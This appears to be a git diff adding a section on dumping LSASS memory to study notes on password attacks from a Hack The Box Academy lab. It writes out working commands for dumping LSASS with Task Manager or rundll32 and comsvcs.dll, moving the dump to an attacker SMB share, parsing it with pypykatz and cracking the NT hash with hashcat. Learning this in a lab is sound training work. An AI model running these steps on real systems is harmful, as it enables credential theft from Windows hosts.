@@ -18,6 +18,7 @@ This document outlines common techniques used in **password attacks**. It is int
     - [Spraying, Stuffing, and Defaults](#spraying-stuffing-and-defaults)
   - [Extracting Passwords from Windows Systems](#extracting-passwords-from-windows-systems)
     - [Attacking SAM, SYSTEM, and SECURITY](#attacking-sam-system-and-security)
+    - [Attacking LSASS](#attacking-lsass)
 
 ---
 
@@ -960,5 +961,126 @@ netexec smb 10.129.202.137 --local-auth -u Bob -p HTB_@cademy_stdnt! --sam
 ![Filtered output](./.images/sam-remote-dump.PNG)
 
 The remotely extracted data matches what was obtained via offline hive dumping, demonstrating a faster alternative once administrative credentials are available.
+
+---
+
+### Attacking LSASS
+
+In addition to the SAM database, the **Local Security Authority Subsystem Service (LSASS)** is a high-value target.
+
+After a user logs in, LSASS:
+
+- Caches credentials in memory
+- Creates access tokens
+- Enforces security policies
+- Writes authentication events to the Windows Security log
+
+Because credentials are stored in memory, dumping the LSASS process often reveals plaintext passwords, NT hashes, Kerberos tickets, and other sensitive material.
+
+**Dumping LSASS Memory**
+
+The typical workflow is to dump LSASS process memory and extract credentials offline.
+
+Common methods include:
+
+- Task Manager (GUI-based)
+- rundll32.exe with comsvcs.dll (CLI-based)
+
+**Task Manager Method**
+
+If GUI access is available:
+
+1. Open `Task Manager`
+2. Select the `Processes` tab
+3. Right click on the `Local Security Authority Process`
+4. Select `Create dump file`
+
+![Filtered output](./.images/task-manager.PNG)
+
+A file called `lsass.DMP` is saved in `%TEMP%`.
+
+![Filtered output](./.images/temp.PNG)
+
+**Transferring the Dump File**
+
+Create an SMB share on the attacker system:
+
+```bash
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support LsassDump /home/htb-ac-681215/Desktop
+```
+
+From the compromised host, transfer the dump:
+
+```powershell
+move lsass.DMP \\10.10.14.51\LsassDump
+```
+
+![Filtered output](./.images/move-lsass.PNG)
+
+The dump file is now available locally:
+
+![Filtered output](./.images/lsass-transfered.PNG)
+
+**Rundll32.exe Method**
+
+The Task Manager approach requires GUI access. A faster and more flexible method uses `rundll32.exe` and `comsvcs.dll`.
+
+First, identify the LSASS process ID (PID).
+
+**CMD**
+
+```powershell
+tasklist /svc
+```
+
+![Filtered output](./.images/tasklist.PNG)
+
+**PowerShell**
+
+```powershell
+Get-Process lsass
+```
+
+![Filtered output](./.images/get-process.PNG)
+
+With the PID (`648`) identified, dump LSASS:
+
+```powershell
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump 648 C:\lsass.dmp full
+```
+
+This invokes `MiniDumpWriteDump` via `comsvcs.dll`, creating a full memory dump of the LSASS process at `C:\lsass.dmp`.
+
+Transfer the dump file to the attacker system using SMB, as shown previously.
+
+**Extracting Credentials with Pypykatz**
+
+`pypykatz` is a Python implementation of Mimikatz that allows LSASS dump parsing directly from Linux.
+
+Extract credentials:
+
+```bash
+pypykatz lsa minidump /home/htb-ac-681215/Desktop/lsass.DMP
+```
+
+The output includes SIDs, usernames, domains, NT hashes, SHA1 hashes, and sometimes plaintext credentials:
+
+![Filtered output](./.images/msv.PNG)
+
+**Cracking NT Hashes**
+
+Extracted NT hashes can be cracked with Hashcat using mode `1000`:
+
+```bash
+hashcat -a 0 -m 1000 31f87811133bc6aaa75a536e77f64314 rockyou.txt
+```
+
+Recovered password:
+
+```
+Mic@123
+```
+
+![Filtered output](./.images/hashcat-lsass.PNG)
 
 ---
